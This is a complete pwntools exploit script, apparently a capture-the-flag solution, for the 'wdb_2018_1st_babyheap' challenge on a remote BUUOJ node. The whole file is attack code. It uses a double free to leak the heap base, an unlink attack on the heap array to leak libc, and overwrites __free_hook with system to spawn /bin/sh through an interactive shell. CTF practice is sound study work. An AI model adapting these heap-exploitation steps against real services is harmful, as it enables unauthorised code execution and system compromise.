from pwn import *

#context.log_level = 'debug'

#p = process('./wdb_2018_1st_babyheap')
p = remote('node4.buuoj.cn', 27761)
elf = ELF('./wdb_2018_1st_babyheap')

libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p ,'''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(index, content):
    sla(b'Choice:', b'1')
    sla(b'Index:', str(index).encode())
    sa(b'Content:', content)

def edit(index, content):
    sla(b'Choice:', b'2')
    sla(b'Index:', str(index).encode())
    sa(b'Content:', content)

def show(index):
    sla(b'Choice:', b'3')
    sla(b'Index:', str(index).encode())

def delete(index):
    sla(b'Choice:', b'4')
    sla(b'Index:', str(index).encode())

alloc(0, p64(0) + p64(0x31) + b'\n')
alloc(1, b'a\n')
alloc(2, b'a\n')
alloc(3, b'a\n')
alloc(4, b'a\n')

delete(2)
delete(3)

show(3)

heap_base = u64(ru(b'\nDone')[:-5].ljust(8, b'\x00')) - 0x60
success('heap_base -> {}'.format(hex(heap_base)))

heaparray = 0x602060

delete(2)

alloc(5, p64(heap_base + 0x10) + b'\n')
alloc(6, b'/bin/sh\x00\n')
alloc(7, b'a\n')
alloc(8, p64(0) * 2 + p64(0x20) + b'\x90\n')
edit(0, p64(0) + p64(0x21) + p64(heaparray - 0x18) + p64(heaparray - 0x10))
delete(1)
show(8)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['__libc_system']
free_hook = libc_base + libc.sym['__free_hook']

edit(0, b'a' * 0x18 + p64(free_hook))
edit(0, p64(system) + b'\n')

delete(6)

p.interactive()